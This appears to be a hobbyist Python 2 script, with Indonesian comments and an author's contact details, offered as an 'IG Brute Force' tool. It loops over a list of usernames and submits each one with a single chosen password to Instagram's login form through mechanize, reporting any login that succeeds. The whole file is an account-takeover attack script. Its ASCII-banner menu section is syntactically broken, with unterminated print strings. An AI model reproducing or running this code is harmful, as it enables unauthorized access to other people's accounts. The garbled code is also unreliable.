#!/bin/bash

# For CMD Windows
# nggak bisa ngoding ya
# coder by IES coder team
# IG Brute Force 
# Contact Me :
# 
"""
Line : ieswahyu
wahyu.st021@gmail.com 
"""

import mechanize
import platform,os

br = mechanize.Browser()

f = open('username.txt')

def options():
    br.set_handle_robots(False)
    br.set_handle_refresh(False)
    br.set_handle_gzip(False)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_redirect(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Iceweasel/31.5.0')]
    mulai()

def keluar():
	print "[!] Keluar ..."
	f.close()
	os.sys.exit()

def mulai():
    try:
        username = f.readline()
        print ""
        password = raw_input("Password : ")
        while username:
            print ("[+] Mencoba Username : "+username)
            br.open("https://www.instagram.com/accounts/login/?force_classic_login")
            br.select_form(nr=0)
            br.form[ 'username' ] = username.strip()
            br.form[ 'password' ] = password
            br.submit()
            log = br.geturl()
            print log
            if log == "https://www.instagram.com/":
                print "[+] Berhasil Login ..."
                keluar()
            else:
                os.system("cls")
            username = f.readline()
    except:
        f.close()

def menu():
	print "
 print" _____ ______   ________      ___       __   ___   ___  ___  ___      ___    ___ ___  ___     
print" |\   _ \  _   \|\   __  \    |\  \     |\  \|\  \ |\  \|\  \|\  \    |\  \  /  /|\  \|\  \    
print" \ \  \\\__\ \  \ \  \|\  \   \ \  \    \ \  \ \  \\_\  \ \  \\\  \   \ \  \/  / | \  \\\  \   
print"  \ \  \\|__| \  \ \   _  _\   \ \  \  __\ \  \ \______  \ \   __  \   \ \    / / \ \  \\\  \  
print"   \ \  \    \ \  \ \  \\  \| __\ \  \|\__\_\  \|_____|\  \ \  \ \  \   \/  /  /   \ \  \\\  \ 
print"    \ \__\    \ \__\ \__\\ _\|\__\ \____________\     \ \__\ \__\ \__\__/  / /      \ \_______\
print"     \|__|     \|__|\|__|\|__\|__|\|____________|      \|__|\|__|\|__|\___/ /        \|_______|
print"                                 IG BRUTE FORCE                                                                    \|___|/                   
                                                                                              
                                                                                              

	print ""
	print "[1] Mulai"
	print "[2] Keluar"
	print " "
	pilih = input("Pilih [1/2] : ")
	if pilih == 1:
		options()
	else:
		keluar()

if __name__ == "__main__":
	menu()
